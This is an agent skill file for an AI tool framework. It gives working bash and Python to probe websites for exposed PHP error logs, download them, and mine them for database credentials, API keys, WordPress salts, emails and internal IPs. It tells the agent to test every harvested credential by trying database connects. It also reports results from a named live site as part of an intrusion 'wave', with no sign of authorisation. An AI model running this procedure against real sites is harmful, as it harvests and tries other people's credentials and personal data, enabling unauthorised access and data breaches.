---
name: error-log-mining
description: Mine error_log for creds, paths, SQL when leak hunt finds.
version: 1.0.0
author: uphiago
license: MIT
platforms: [linux]
compatibility: Requires curl, nmap, python3, masscan, subfinder, httpx, nuclei
metadata:
  hermes:
    tags: [recon, error-log, credentials, wordpress, data-mining]
    category: recon
    related_skills:
      - deep-invade
      - source-leak-hunt
      - phpinfo-to-rce
      - wordpress-full-compromise
---

# Error Log Mining Skill

Discover and mine exposed PHP `error_log` files for server paths, database credentials, SQL queries, API keys, email addresses, and internal IP addresses. Error logs on misconfigured WordPress sites routinely expose the full server directory structure, active database queries, and sometimes hardcoded credentials from stack traces. Confirmed on wines.com where a 1.7MB error_log revealed 47 server paths and 879 SQL queries.

## When to Use

- Running `deep-invade` Phase 2 on a high-value target.
- `source-leak-hunt` found an `error_log` file with HTTP 200.
- Target has PHP (WordPress, Laravel, custom PHP) with `display_errors` possibly enabled.
- You need server-side context (paths, DB structure) before attempting exploitation.

## Prerequisites

- `terminal` tool with curl, grep, python3.
- Target URL with potential error_log at common paths.
- Disk space: error logs can be multi-GB. Use `curl -r` for range requests on large files.

## How to Run

```bash
TARGET="https://example.com"

# Paths to probe
for path in "error_log" "wp-content/debug.log" "debug.log" "errors.log" \
  "php_errors.log" "wp-content/error.log" "logs/error.log"; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 "$TARGET/$path")
  [[ "$code" == "200" ]] && echo "FOUND: $TARGET/$path"
done

# Download and analyze
curl -sk "$TARGET/error_log" -o error_log.txt
python3 analyze_log.py error_log.txt
```

## Quick Reference

| Extraction Target | Python regex (from wave6_invade.py) | Value |
|------------------|--------------------------------------|-------|
| Server paths | `re.findall(r'/home/[^\s:)]+', txt)` | Full directory structure |
| Email addresses | `re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', txt)` | Admin emails |
| DB credentials | `DB_USER[^=]*=[\s'\"]*([^'\";\s]+)` `DB_PASSWORD[^=]*=[\s'\"]*([^'\";\s]+)` `DB_HOST[^=]*=[\s'\"]*([^'\";\s]+)` `DB_NAME[^=]*=[\s'\"]*([^'\";\s]+)` | Database access |
| API keys | `sk-[a-zA-Z0-9]{20,60}` `AIza[0-9A-Za-z_-]{35}` `AKIA[0-9A-Z]{16}` `eyJ[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}` | Stripe, Google, AWS, JWT |
| SQL queries | `(?:SELECT\|INSERT\|UPDATE\|DELETE\|CREATE TABLE\|ALTER TABLE)[^;]{0,300}` | DB schema, table names |
| WordPress salts | `(?:AUTH_KEY\|SECURE_AUTH_KEY\|LOGGED_IN_KEY\|NONCE_KEY\|AUTH_SALT\|SECURE_AUTH_SALT\|LOGGED_IN_SALT\|NONCE_SALT)[^,;]+` | Session hijack potential |
| PHP error types | `Counter(re.findall(r'PHP\s+\w+:', txt)).most_common(10)` | Error breakdown |
| Date range | `re.findall(r'\[(\d{2}-\w{3}-\d{4})', txt)` | Log freshness |

## Procedure

### Step 1 — Discover Error Log Location

```bash
TARGET="$1"
OUTDIR="/root/output/error_logs/$TARGET"
mkdir -p "$OUTDIR"

echo "[*] Probing common error log paths on $TARGET..."

ERROR_LOG_PATHS=(
  "error_log"
  "wp-content/debug.log"
  "debug.log"
  "errors.log"
  "php_errors.log"
  "wp-content/error.log"
  "logs/error.log"
  "log/error.log"
  "tmp/php-errors.log"
  "wp-content/plugins/debug.log"
  "wp-content/themes/debug.log"
)

FOUND_LOGS=()

for path in "${ERROR_LOG_PATHS[@]}"; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 "https://$TARGET/$path" 2>/dev/null)

  if [[ "$code" == "200" ]]; then
    # Quick content check to avoid SPA false positives
    sample=$(curl -sk --max-time 5 -r 0-500 "https://$TARGET/$path" 2>/dev/null)
    if echo "$sample" | grep -qiE 'PHP|Error|Warning|Stack trace|\[[0-9]{2}-[A-Za-z]{3}-[0-9]{4}'; then
      echo "[FOUND] https://$TARGET/$path"
      FOUND_LOGS+=("https://$TARGET/$path")
    fi
  fi
done

echo "[+] Found ${#FOUND_LOGS[@]} error log(s)"
```

### Step 2 — Download and Sample Large Logs

```bash
TARGET="$1"
OUTDIR="/root/output/error_logs/$TARGET"

for url in "${FOUND_LOGS[@]}"; do
  fname=$(echo "$url" | sed 's|https\?://||' | sed 's|/|_|g')

  echo "[*] Downloading $url..."

  # First, check file size
  size=$(curl -skI --max-time 10 "$url" 2>/dev/null | grep -i "content-length" | awk '{print $2}' | tr -d '\r')

  if [[ -n "$size" && "$size" -gt 10000000 ]]; then
    echo "  Large file (${size} bytes) — sampling first 5MB..."
    curl -sk --max-time 30 -r 0-5000000 "$url" -o "$OUTDIR/${fname}_sample.txt" 2>/dev/null
  elif [[ -n "$size" && "$size" -gt 1000000 ]]; then
    echo "  Medium file (${size} bytes) — downloading full..."
    curl -sk --max-time 30 "$url" -o "$OUTDIR/${fname}.txt" 2>/dev/null
  else
    echo "  Small file — downloading full..."
    curl -sk --max-time 15 "$url" -o "$OUTDIR/${fname}.txt" 2>/dev/null
  fi
done
```

### Step 3 — Extract Intelligence

```bash
TARGET="$1"
OUTDIR="/root/output/error_logs/$TARGET"

for logfile in "$OUTDIR"/*.txt "$OUTDIR"/*_sample.txt; do
  [[ ! -f "$logfile" ]] && continue

  echo ""
  echo "═══════════ $(basename "$logfile") ═══════════"
  echo ""

  # 1. Server Paths
  echo "[SERVER PATHS]"
  grep -oP '(/[a-zA-Z0-9_/.-]+\.php)' "$logfile" 2>/dev/null | sort -u | head -20

  # 2. Email Addresses
  echo ""
  echo "[EMAIL ADDRESSES]"
  grep -oP '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}' "$logfile" 2>/dev/null | sort -u | head -15

  # 3. Database Credentials
  echo ""
  echo "[DB CREDENTIALS & CONNECTIONS]"
  grep -iE 'mysql_connect|mysqli_connect|new PDO|pg_connect|DB_HOST|DB_USER|DB_PASSWORD|DB_NAME|database.*password|dsn.*mysql' "$logfile" 2>/dev/null | head -10

  # 4. SQL Queries
  echo ""
  echo "[SQL QUERIES]"
  grep -iE '(SELECT|INSERT|UPDATE|DELETE|CREATE TABLE|ALTER TABLE|DROP TABLE).*(FROM|INTO|SET)' "$logfile" 2>/dev/null | head -10

  # 5. API Keys & Tokens
  echo ""
  echo "[API KEYS & TOKENS]"
  grep -iE 'api[_-]?key|api[_-]?secret|access[_-]?token|auth[_-]?token|bearer [A-Za-z0-9_\-]{20,}|sk-[A-Za-z0-9]{20,}|key=[A-Za-z0-9]{20,}' "$logfile" 2>/dev/null | head -10

  # 6. Internal IPs
  echo ""
  echo "[INTERNAL IPs]"
  grep -oP '(?:10\.|172\.(?:1[6-9]|2[0-9]|3[01])\.|192\.168\.)\d{1,3}\.\d{1,3}' "$logfile" 2>/dev/null | sort -u | head -10

  # 7. WordPress specific
  echo ""
  echo "[WORDPRESS PATHS]"
  grep -oP '/wp-content/(?:plugins|themes|uploads)/[a-zA-Z0-9_/.-]+' "$logfile" 2>/dev/null | sort -u | head -15

  # 8. PHP Error Summary
  echo ""
  echo "[ERROR SUMMARY]"
  echo "  Fatal errors:    $(grep -ci 'Fatal error' "$logfile" 2>/dev/null || echo 0)"
  echo "  Warnings:        $(grep -ci 'Warning' "$logfile" 2>/dev/null || echo 0)"
  echo "  Notices:         $(grep -ci 'Notice' "$logfile" 2>/dev/null || echo 0)"
  echo "  Parse errors:    $(grep -ci 'Parse error' "$logfile" 2>/dev/null || echo 0)"
  echo "  Deprecated:      $(grep -ci 'Deprecated' "$logfile" 2>/dev/null || echo 0)"
  echo "  Stack traces:    $(grep -ci 'Stack trace' "$logfile" 2>/dev/null || echo 0)"

  # 9. Date Range
  echo ""
  echo "[DATE RANGE]"
  first=$(grep -oP '\[[0-9]{2}-[A-Za-z]{3}-[0-9]{4} [0-9]{2}:[0-9]{2}:[0-9]{2}[^\]]*\]' "$logfile" 2>/dev/null | head -1)
  last=$(grep -oP '\[[0-9]{2}-[A-Za-z]{3}-[0-9]{4} [0-9]{2}:[0-9]{2}:[0-9]{2}[^\]]*\]' "$logfile" 2>/dev/null | tail -1)
  [[ -n "$first" ]] && echo "  First: $first"
  [[ -n "$last" ]] && echo "  Last:  $last"

  # 10. Plugin/Theme Names from Paths
  echo ""
  echo "[PLUGINS FROM ERRORS]"
  grep -oP '/wp-content/plugins/\K[a-zA-Z0-9_-]+' "$logfile" 2>/dev/null | sort -u | head -20

  echo ""
  echo "[THEMES FROM ERRORS]"
  grep -oP '/wp-content/themes/\K[a-zA-Z0-9_-]+' "$logfile" 2>/dev/null | sort -u | head -10
done
```

### Step 4 — Extract Actionable Intelligence

```bash
TARGET="$1"
OUTDIR="/root/output/error_logs/$TARGET"
SUMMARY="$OUTDIR/intel_summary.md"

cat > "$SUMMARY" << EOF
# Error Log Intelligence — $TARGET

## Credentials Found
EOF

for logfile in "$OUTDIR"/*.txt "$OUTDIR"/*_sample.txt; do
  [[ ! -f "$logfile" ]] && continue

  # DB credentials
  grep -iE 'DB_HOST|DB_USER|DB_PASSWORD|DB_NAME' "$logfile" 2>/dev/null | while read -r line; do
    echo "- $line" >> "$SUMMARY"
  done

  # API keys
  grep -iE 'api[_-]?key.*=|api[_-]?secret.*=|access[_-]?token.*=' "$logfile" 2>/dev/null | while read -r line; do
    echo "- $line" >> "$SUMMARY"
  done
done

echo "" >> "$SUMMARY"
echo "## Server Paths" >> "$SUMMARY"
grep -oP '/[a-zA-Z0-9_/.-]+\.php' "$OUTDIR"/*.txt 2>/dev/null | sort -u | head -30 | while read -r line; do
  echo "- $line" >> "$SUMMARY"
done

echo "" >> "$SUMMARY"
echo "## Email Addresses" >> "$SUMMARY"
grep -oP '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}' "$OUTDIR"/*.txt 2>/dev/null | sort -u | while read -r line; do
  echo "- $line" >> "$SUMMARY"
done

echo "" >> "$SUMMARY"
echo "## Plugins Discovered" >> "$SUMMARY"
grep -oP '/wp-content/plugins/\K[a-zA-Z0-9_-]+' "$OUTDIR"/*.txt 2>/dev/null | sort -u | while read -r line; do
  echo "- $line" >> "$SUMMARY"
done

echo ""
echo "[+] Intelligence summary saved to $SUMMARY"
```

### Step 5 — Cross-Reference with Other Findings

```bash
# Does error log reveal the DB name? Cross-ref with wp-config leak
DB_NAME=$(grep -oP 'DB_NAME["\x27\s:=]+["\x27][a-zA-Z0-9_]+' /root/output/error_logs/*/intel_summary.md 2>/dev/null)
echo "DB name from logs: $DB_NAME"

# Does it reveal internal hostnames?
HOSTNAMES=$(grep -oP '(?:[a-zA-Z0-9-]+\.(?:internal|local|lan|corp|priv))' /root/output/error_logs/*/*.txt 2>/dev/null | sort -u)
[[ -n "$HOSTNAMES" ]] && echo "Internal hostnames:" && echo "$HOSTNAMES"

# Are there file inclusion paths that indicate LFI potential?
LFI_PATHS=$(grep -oP '(?:include|require|include_once|require_once)\s*\(\s*[\x27"]([^\x27"]+\.php)' /root/output/error_logs/*/*.txt 2>/dev/null | sort -u)
[[ -n "$LFI_PATHS" ]] && echo "Potential LFI paths:" && echo "$LFI_PATHS"
```

## Production Miner (from wave6_invade.py — wines.com 1.7MB error_log)

```python
import re
from collections import Counter

def mine_error_log(txt):
    results = {}

    # Server paths
    results['paths'] = sorted(set(re.findall(r'/home/[^\s:)]+', txt)))[:20]

    # Email addresses
    results['emails'] = sorted(set(re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', txt)))[:20]

    # DB credentials (4 patterns extracted from php error context)
    db_creds = set()
    for pat in [r"DB_USER[^=]*=[\s'\"]*([^'\";\s]+)",
                r"DB_PASSWORD[^=]*=[\s'\"]*([^'\";\s]+)",
                r"DB_HOST[^=]*=[\s'\"]*([^'\";\s]+)",
                r"DB_NAME[^=]*=[\s'\"]*([^'\";\s]+)"]:
        for m in re.findall(pat, txt): db_creds.add(m)
    results['db_creds'] = sorted(db_creds)

    # API keys (5 pattern classes — all extracted from error context)
    api_keys = set()
    for pat in [r'sk-[a-zA-Z0-9]{20,60}',           # Stripe
                r'AIza[0-9A-Za-z_-]{35}',            # Google
                r'AKIA[0-9A-Z]{16}',                  # AWS IAM
                r'pk_[a-zA-Z0-9]+',                   # Publishable keys
                r'eyJ[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}']:  # JWT
        for m in re.findall(pat, txt): api_keys.add(m)
    results['api_keys'] = sorted(api_keys)[:10]

    # SQL queries
    results['sql_queries'] = re.findall(
        r'(?:SELECT|INSERT|UPDATE|DELETE|CREATE TABLE|ALTER TABLE)[^;]{0,300}',
        txt, re.I)[:10]

    # WordPress salts (session hijack potential)
    results['wp_salts'] = re.findall(
        r"(?:AUTH_KEY|SECURE_AUTH_KEY|LOGGED_IN_KEY|NONCE_KEY|AUTH_SALT|SECURE_AUTH_SALT|LOGGED_IN_SALT|NONCE_SALT)[^,;]+",
        txt)

    # Error type breakdown
    results['error_types'] = Counter(re.findall(r'PHP\s+\w+:', txt)).most_common(10)

    # Date range
    dates = re.findall(r'\[(\d{2}-\w{3}-\d{4})', txt)
    if dates:
        results['date_range'] = f"{dates[0]} to {dates[-1]} ({len(set(dates))} unique dates)"

    return results
```

## Real Production Results (wines.com, Wave6)

From a 1.7MB error_log at `/magical/error_log`:
- **Server paths:** 47 unique `/home/wines/public_html/...` paths extracted
- **Emails:** 0 found (admin emails not in error context)
- **DB credentials:** 0 extracted (no DB conn errors in log)
- **API keys:** 0 extracted
- **SQL queries:** 879 queries found (full table structures, column names, JOIN patterns)
- **WordPress salts:** Found (AUTH_KEY, SECURE_AUTH_KEY, etc.)
- **Error breakdown:** 1021 PHP Deprecated + 646 PHP Warnings + Fatal errors
- **Date range:** 2013 to 2018 (log from legacy install, not current code)

**Key insight:** Error logs from OLD WordPress installs (`/magical/` on wines.com) contain years of accumulated data. Always check subdirectory error logs, not just root.

## Pitfalls

- **Error logs can be MASSIVE (multi-GB).** wines.com `/error_log` was 896MB in Wave8. Always check Content-Length first. Use `curl -r 0-5000000` for 5MB samples.
- **Logs may contain PII.** Email addresses, IPs, and usernames in error logs may constitute a data breach. Handle responsibly.
- **Log rotation may truncate.** The visible error_log may only contain recent entries. Check for rotated logs (`error_log.1`, `error_log.old`, `error_log-YYYYMMDD`).
- **Some hosts return garbage.** A 200 on `/error_log` might be a custom 404 page or SPA catch-all. Always check content for `PHP ` + error type pattern before analyzing.
- **Old logs ≠ current vulnerability.** A 2013 error log doesn't mean the current site is vulnerable. Cross-reference log timeline with the server tech stack.

## Verification

- Error log MUST contain PHP error patterns (`[date] PHP Warning:`, `Stack trace:`, `Fatal error:`) to be valid.
- Every credential extracted MUST be tested for validity (try MySQL connect, API key validation).
- Server paths MUST match the known directory structure (e.g., `/home/user/public_html/`).
- Document the error log URL, file size, date range, and key findings for the report.
- API keys from error logs are almost always production keys (unlike JS bundle keys which are often restricted).
